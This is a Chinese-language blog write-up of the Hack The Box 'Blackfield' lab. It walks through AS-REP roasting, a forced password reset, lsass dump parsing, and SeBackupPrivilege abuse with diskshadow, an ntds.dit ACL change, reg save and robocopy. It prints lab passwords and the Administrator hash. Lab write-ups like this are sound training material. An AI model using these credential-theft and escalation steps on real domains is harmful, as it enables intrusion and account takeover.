@@ -1,0 +1,1021 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="扫一下端口 没看到具体的域名，用crackmapexec看一下 BLACKFIELD.local 域名知道了，之后根据开放的端口看一下，kerbrute,rpcclient都没">
+<title>Blackfield</title>
+
+<link rel='canonical' href='https://nergigantes.github.io/htb/blackfield/'>
+
+<link rel="stylesheet" href="/scss/style.min.f720cbcbc8f9265d2875caa41c2c2572405d50fc427ef4375391537c33376c29.css"><meta property='og:title' content="Blackfield">
+<meta property='og:description' content="扫一下端口 没看到具体的域名，用crackmapexec看一下 BLACKFIELD.local 域名知道了，之后根据开放的端口看一下，kerbrute,rpcclient都没">
+<meta property='og:url' content='https://nergigantes.github.io/htb/blackfield/'>
+<meta property='og:site_name' content='NergiganteS&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Htb' /><meta property='article:published_time' content='2025-03-29T13:36:53&#43;08:00'/><meta property='article:modified_time' content='2025-03-29T13:37:44&#43;08:00'/><meta property='og:image' content='https://nergigantes.github.io/htb/blackfield/19.jpg' />
+<meta name="twitter:title" content="Blackfield">
+<meta name="twitter:description" content="扫一下端口 没看到具体的域名，用crackmapexec看一下 BLACKFIELD.local 域名知道了，之后根据开放的端口看一下，kerbrute,rpcclient都没"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://nergigantes.github.io/htb/blackfield/19.jpg' />
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu315a7ad84d8f1f09f998948c005c5c1b_42437_300x0_resize_box_3.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">NergiganteS&#39;s Blog</a></h1>
+            <h2 class="site-description">分享学习笔记路程</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                    
+                        <li id="i18n-switch">  
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
+                                
+                                    <option value="https://nergigantes.github.io/en/" >English</option>
+                                
+                                    <option value="https://nergigantes.github.io/" selected>中文</option>
+                                
+                                    <option value="https://nergigantes.github.io/ar/" >عربي</option>
+                                
+                            </select>
+                        </li>
+                    
+                
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/htb/blackfield/">
+                <img src="/htb/blackfield/19_hu4aa1dd88e39e4529686577550e201cfa_964272_800x0_resize_q75_box.jpg"
+                        srcset="/htb/blackfield/19_hu4aa1dd88e39e4529686577550e201cfa_964272_800x0_resize_q75_box.jpg 800w, /htb/blackfield/19_hu4aa1dd88e39e4529686577550e201cfa_964272_1600x0_resize_q75_box.jpg 1600w"
+                        width="800" 
+                        height="450" 
+                        loading="lazy"
+                        alt="Featured image of post Blackfield" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/htb/" >
+                Htb
+            </a>
+        
+            <a href="/categories/%E5%9F%9F/" >
+                域
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/htb/blackfield/">Blackfield</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Mar 29, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 3 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p>扫一下端口</p>
+<p><img src="/htb/blackfield/1742784922578-e573fa60-eb3d-4381-b080-4edb2318aaf0.png"
+	width="1178"
+	height="799"
+	srcset="/htb/blackfield/1742784922578-e573fa60-eb3d-4381-b080-4edb2318aaf0_hu2370eb7888846484cf71d579c686ed9c_1014451_480x0_resize_box_3.png 480w, /htb/blackfield/1742784922578-e573fa60-eb3d-4381-b080-4edb2318aaf0_hu2370eb7888846484cf71d579c686ed9c_1014451_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="147"
+		data-flex-basis="353px"
+	
+></p>
+<p>没看到具体的域名，用crackmapexec看一下</p>
+<p><img src="/htb/blackfield/1742785021601-22f57dc8-f7da-41ef-aa20-7b879b022791.png"
+	width="1187"
+	height="477"
+	srcset="/htb/blackfield/1742785021601-22f57dc8-f7da-41ef-aa20-7b879b022791_hu8abfa9238783e2932218477094aba48f_194668_480x0_resize_box_3.png 480w, /htb/blackfield/1742785021601-22f57dc8-f7da-41ef-aa20-7b879b022791_hu8abfa9238783e2932218477094aba48f_194668_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="248"
+		data-flex-basis="597px"
+	
+>BLACKFIELD.local 域名知道了，之后根据开放的端口看一下，kerbrute,rpcclient都没有有用的信息，smb发现了一个共享的文件</p>
+<p><img src="/htb/blackfield/1742785141093-8f8f771b-5a3f-41f6-bda8-a92676d9cb33.png"
+	width="662"
+	height="254"
+	srcset="/htb/blackfield/1742785141093-8f8f771b-5a3f-41f6-bda8-a92676d9cb33_hu5a8d5330524c586a649175389f57bf6d_48347_480x0_resize_box_3.png 480w, /htb/blackfield/1742785141093-8f8f771b-5a3f-41f6-bda8-a92676d9cb33_hu5a8d5330524c586a649175389f57bf6d_48347_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="260"
+		data-flex-basis="625px"
+	
+></p>
+<p>进去看一下</p>
+<p>smbclient -N //10.10.10.192/profiles$（$用这个是因为是隐藏文件）</p>
+<p><img src="/htb/blackfield/1742785339249-c800b3a6-813c-4cf5-aa9c-ff79faf35792.png"
+	width="973"
+	height="814"
+	srcset="/htb/blackfield/1742785339249-c800b3a6-813c-4cf5-aa9c-ff79faf35792_hud8612a6acc75b83f66a155f84baf18d2_228082_480x0_resize_box_3.png 480w, /htb/blackfield/1742785339249-c800b3a6-813c-4cf5-aa9c-ff79faf35792_hud8612a6acc75b83f66a155f84baf18d2_228082_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="119"
+		data-flex-basis="286px"
+	
+></p>
+<p>这应该是一个用户名的列表，进行AS-REP Roasting攻击</p>
+<p><img src="/htb/blackfield/1742785829065-71993d75-eca6-4eed-809a-51092cec3e46.png"
+	width="1177"
+	height="280"
+	srcset="/htb/blackfield/1742785829065-71993d75-eca6-4eed-809a-51092cec3e46_hube46d7ff689546758bfde8f38bec0e34_162584_480x0_resize_box_3.png 480w, /htb/blackfield/1742785829065-71993d75-eca6-4eed-809a-51092cec3e46_hube46d7ff689546758bfde8f38bec0e34_162584_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="420"
+		data-flex-basis="1008px"
+	
+></p>
+<p>拿到了一个support用户的hash，爆破一下</p>
+<p><img src="/htb/blackfield/1742785920751-1d690e14-cbde-4d79-8c88-a5bf62bb5de4.png"
+	width="1124"
+	height="699"
+	srcset="/htb/blackfield/1742785920751-1d690e14-cbde-4d79-8c88-a5bf62bb5de4_huf625f3157094564174504dc44e3e471b_347326_480x0_resize_box_3.png 480w, /htb/blackfield/1742785920751-1d690e14-cbde-4d79-8c88-a5bf62bb5de4_huf625f3157094564174504dc44e3e471b_347326_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="160"
+		data-flex-basis="385px"
+	
+></p>
+<p>之前看到了5985是开放的,evil-winrm登一下</p>
+<p>evil-winrm -i 10.10.10.192 -u support -p #00^BlackKnight</p>
+<p>登不了，smbexec也是一样，没有shell</p>
+<p>那就用bloodhound-python去分析一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">bloodhound-python -c ALL -u support -p &#39;#00^BlackKnight&#39; -d blackfield.local -dc dc01.blackfield.local -ns 10.10.10.192
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>support用户没有什么权限可利用的，除了能对一个<img src="/htb/blackfield/1742799700716-fb6185aa-182d-4b06-9dda-9d95a3afaa7e.png"
+	width="2401"
+	height="933"
+	srcset="/htb/blackfield/1742799700716-fb6185aa-182d-4b06-9dda-9d95a3afaa7e_hube4db955a3af2539d1c9423fea8bee1c_96949_480x0_resize_box_3.png 480w, /htb/blackfield/1742799700716-fb6185aa-182d-4b06-9dda-9d95a3afaa7e_hube4db955a3af2539d1c9423fea8bee1c_96949_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="257"
+		data-flex-basis="617px"
+	
+></p>
+<p>AUDIT2020的用户有强制更改密码的权限，让我们看看这个权限怎么用</p>
+<p><a class="link" href="https://room362.com/posts/2017/reset-ad-user-password-with-linux/"  target="_blank" rel="noopener"
+    >https://room362.com/posts/2017/reset-ad-user-password-with-linux/</a></p>
+<p>这篇文章写了如何重置密码，来让我们滥用这个权限</p>
+<p>使用rpcclient登陆support账户</p>
+<ol>
+<li>rpcclient -U &lsquo;support&rsquo; 10.10.10.192</li>
+<li>setuserinfo2 AUDIT2020 23 &lsquo;12345678&rsquo;</li>
+</ol>
+<p>现在来验证一下，失败了，，？<img src="/htb/blackfield/1742801501583-4cf17343-476a-4eab-a81e-d850005fabc3.png"
+	width="482"
+	height="51"
+	srcset="/htb/blackfield/1742801501583-4cf17343-476a-4eab-a81e-d850005fabc3_hu69f53e9093138d6587c4ab93e5081b46_17057_480x0_resize_box_3.png 480w, /htb/blackfield/1742801501583-4cf17343-476a-4eab-a81e-d850005fabc3_hu69f53e9093138d6587c4ab93e5081b46_17057_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="945"
+		data-flex-basis="2268px"
+	
+></p>
+<p>更换一下密码 123456789a!</p>
+<p>成功</p>
+<p><img src="/htb/blackfield/1742801590855-e1b80d21-6f72-4bd8-b543-ad5302d3d938.png"
+	width="1214"
+	height="511"
+	srcset="/htb/blackfield/1742801590855-e1b80d21-6f72-4bd8-b543-ad5302d3d938_hu6229a7a0817ea1cd52c0898a84fece0b_269160_480x0_resize_box_3.png 480w, /htb/blackfield/1742801590855-e1b80d21-6f72-4bd8-b543-ad5302d3d938_hu6229a7a0817ea1cd52c0898a84fece0b_269160_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="237"
+		data-flex-basis="570px"
+	
+></p>
+<p>进去后能翻一个新的文件夹，找到了一个管理员的密码?</p>
+<p><img src="/htb/blackfield/1742994323198-839f4dce-8200-4c19-aa63-8e227471057f.png"
+	width="806"
+	height="325"
+	srcset="/htb/blackfield/1742994323198-839f4dce-8200-4c19-aa63-8e227471057f_hue7c81b88f8dc7dffd43dbb457c15bec5_67161_480x0_resize_box_3.png 480w, /htb/blackfield/1742994323198-839f4dce-8200-4c19-aa63-8e227471057f_hue7c81b88f8dc7dffd43dbb457c15bec5_67161_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="248"
+		data-flex-basis="595px"
+	
+></p>
+<p>很遗憾这是fake。。</p>
+<p>后面了解的一个重要的压缩包，<strong>lsass.zip</strong></p>
+<p><img src="/htb/blackfield/1742994469425-08b8fb83-7bf4-425d-b0c3-eea7d1b7ea00.png"
+	width="1108"
+	height="655"
+	srcset="/htb/blackfield/1742994469425-08b8fb83-7bf4-425d-b0c3-eea7d1b7ea00_huc4ef1f9d0f564b0fed40e0bafa1f31c6_92403_480x0_resize_box_3.png 480w, /htb/blackfield/1742994469425-08b8fb83-7bf4-425d-b0c3-eea7d1b7ea00_huc4ef1f9d0f564b0fed40e0bafa1f31c6_92403_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="169"
+		data-flex-basis="405px"
+	
+></p>
+<p>用pypykatz lsa minidump lsass.dmp分析了一堆账户密码，最有价值的是这个账户</p>
+<p><img src="/htb/blackfield/1742995714597-4908c8cd-f6a9-434d-8b5e-97dfa0a2378d.png"
+	width="1554"
+	height="835"
+	srcset="/htb/blackfield/1742995714597-4908c8cd-f6a9-434d-8b5e-97dfa0a2378d_hu09fbdeb6b537c46d6cac8f000964e9a1_97192_480x0_resize_box_3.png 480w, /htb/blackfield/1742995714597-4908c8cd-f6a9-434d-8b5e-97dfa0a2378d_hu09fbdeb6b537c46d6cac8f000964e9a1_97192_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="186"
+		data-flex-basis="446px"
+	
+></p>
+<p><img src="/htb/blackfield/1742995743126-468132d3-7c96-4f57-8c37-f4b0d14f5e18.png"
+	width="775"
+	height="199"
+	srcset="/htb/blackfield/1742995743126-468132d3-7c96-4f57-8c37-f4b0d14f5e18_hu74756b240d97a5efc16e12e91523c7fc_33304_480x0_resize_box_3.png 480w, /htb/blackfield/1742995743126-468132d3-7c96-4f57-8c37-f4b0d14f5e18_hu74756b240d97a5efc16e12e91523c7fc_33304_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="389"
+		data-flex-basis="934px"
+	
+></p>
+<p>有了hash而且有CanPSRmote可以用evil登陆尝试一下了9658d1d1dcd9250115e2205d9f48400d</p>
+<p><img src="/htb/blackfield/1742995849842-74cf7e24-0faf-4316-85e2-03817ef81e4b.png"
+	width="1057"
+	height="427"
+	srcset="/htb/blackfield/1742995849842-74cf7e24-0faf-4316-85e2-03817ef81e4b_hu1042a2aa174d66e8f4d6ae7b90d0943e_88537_480x0_resize_box_3.png 480w, /htb/blackfield/1742995849842-74cf7e24-0faf-4316-85e2-03817ef81e4b_hu1042a2aa174d66e8f4d6ae7b90d0943e_88537_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="247"
+		data-flex-basis="594px"
+	
+></p>
+<p>嗯，进来了</p>
+<p>之后whoami /priv查看特权</p>
+<p><img src="/htb/blackfield/1743148236140-cc9f35d9-d618-4bca-9b30-f0fbbe78730b.png"
+	width="844"
+	height="332"
+	srcset="/htb/blackfield/1743148236140-cc9f35d9-d618-4bca-9b30-f0fbbe78730b_hu850b9285cb155fcaf7c187c11b3c5d4b_126786_480x0_resize_box_3.png 480w, /htb/blackfield/1743148236140-cc9f35d9-d618-4bca-9b30-f0fbbe78730b_hu850b9285cb155fcaf7c187c11b3c5d4b_126786_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="254"
+		data-flex-basis="610px"
+	
+></p>
+<p>特殊点在这，SeBackupPrivilege</p>
+<p>我们拥有这个权限</p>
+<p><strong><font style="color:rgb(51, 51, 51);">SeBackupPrivilege 特权允许用户对系统中的大部分文件进行备份，哪怕文件的访问控制列表（ACL）并未赋予该用户这种访问权限。因此，攻击者可以通过 SeBackupPrivilege 特权备份整个系统盘，从而直接从创建的备份卷中访问任何文件。</font></strong></p>
+<p><strong><font style="color:rgb(51, 51, 51);"></font></strong></p>
+<p>根据**<font style="color:rgb(51, 51, 51);">SeBackupPrivilege利用流程走</font>**</p>
+<p><strong><font style="color:rgb(51, 51, 51);"></font></strong></p>
+<p><font style="color:rgb(51, 51, 51);">1.建立 shadowscript.txt  文件</font></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">set context persistent nowriters#
+</span></span><span class="line"><span class="cl">add volume c: alias binsec#
+</span></span><span class="line"><span class="cl">create#
+</span></span><span class="line"><span class="cl">expose %binsec% z:#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><font style="color:rgb(51, 51, 51);">之后将该文件上传到 C:.enum  目录下（自行建立）</font></p>
+<p><font style="color:rgb(51, 51, 51);">2修改使用者权限 利用 ACL-object让账号用有</font><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;C:\Windows\NTDS\ntds.dit&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);">的存取權权</font></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">$NTDS = &#34;C:\Windows\NTDS\ntds.dit&#34;
+</span></span><span class="line"><span class="cl">$acl = Get-Acl $NTDS
+</span></span><span class="line"><span class="cl">$AccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule(&#34;blackfield.local\svc_backup&#34;,&#34;FullControl&#34;,&#34;Allow&#34;)
+</span></span><span class="line"><span class="cl">$acl.SetAccessRule($AccessRule)
+</span></span><span class="line"><span class="cl">$acl | Set-Acl $NTDS
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><font style="color:rgb(51, 51, 51);">使用完后检查</font></p>
+<p><img src="/htb/blackfield/1743150088636-6cf7a4bf-5943-4b60-a34d-7100f2b23ae1.png"
+	width="815"
+	height="95"
+	srcset="/htb/blackfield/1743150088636-6cf7a4bf-5943-4b60-a34d-7100f2b23ae1_hu61a6ae6b3d06643f8c1915d0c956a657_23857_480x0_resize_box_3.png 480w, /htb/blackfield/1743150088636-6cf7a4bf-5943-4b60-a34d-7100f2b23ae1_hu61a6ae6b3d06643f8c1915d0c956a657_23857_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="857"
+		data-flex-basis="2058px"
+	
+></p>
+<p><font style="color:rgb(51, 51, 51);">3执行diskshadow.exe</font></p>
+<p><font style="color:rgb(51, 51, 51);">diskshadow.exe /s C:.enum\shadowscript.txt</font></p>
+<p><font style="color:rgb(51, 51, 51);">只后抓取俩个重要文件</font></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">reg save HKLM\SYSTEM SYSTEM.SAV
+</span></span><span class="line"><span class="cl">reg save HKLM\SAM SAM.SAV（域不需要）
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><font style="color:rgb(51, 51, 51);">现在当前目录下就有了</font></p>
+<p><img src="/htb/blackfield/1743150355929-af3ff2ac-c575-4497-83e1-f413da26b251.png"
+	width="861"
+	height="306"
+	srcset="/htb/blackfield/1743150355929-af3ff2ac-c575-4497-83e1-f413da26b251_hud8a25d772731c33f488e214015c0f25f_36231_480x0_resize_box_3.png 480w, /htb/blackfield/1743150355929-af3ff2ac-c575-4497-83e1-f413da26b251_hud8a25d772731c33f488e214015c0f25f_36231_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="281"
+		data-flex-basis="675px"
+	
+></p>
+<p><font style="color:rgb(51, 51, 51);">再copy一下ntds.dit</font></p>
+<p><font style="color:rgb(51, 51, 51);">robocopy /b Z:\Windows\NTDS C:\Users\Public ntds.dit</font></p>
+<p><font style="color:rgb(51, 51, 51);">之后传回爆破</font></p>
+<p><font style="color:rgb(51, 51, 51);">Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::</font></p>
+<p><img src="/htb/blackfield/1743155209612-7856d91f-8367-4be4-bd66-74acafccc2b0.png"
+	width="1198"
+	height="386"
+	srcset="/htb/blackfield/1743155209612-7856d91f-8367-4be4-bd66-74acafccc2b0_huc46a0c9d667e2b645fc9d46202d127ed_224175_480x0_resize_box_3.png 480w, /htb/blackfield/1743155209612-7856d91f-8367-4be4-bd66-74acafccc2b0_huc46a0c9d667e2b645fc9d46202d127ed_224175_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="310"
+		data-flex-basis="744px"
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
